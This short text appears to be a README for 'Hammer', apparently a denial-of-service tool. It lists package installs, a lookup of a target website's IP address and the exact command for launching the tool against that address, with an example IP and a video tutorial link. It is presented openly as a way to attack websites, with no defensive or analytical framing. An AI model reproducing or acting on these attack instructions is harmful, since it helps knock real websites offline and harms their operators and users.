$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>

Hammer need <b>Name Server</b> of that website which you want to attack...
$ nslookup example.com  (to Get IP Address of Website)
Note the IP Address of that Website

And then 
$ cd Hammer
$ python hammer.py -s [ip Address] -t 135
example 
$ python hammer.py -s 123.45.67.89 -t 135

Video Tutorial:
How to use Hammer [`Watch it`](http://www.youtube.com/watch?v=HVbRUhX2EPo)
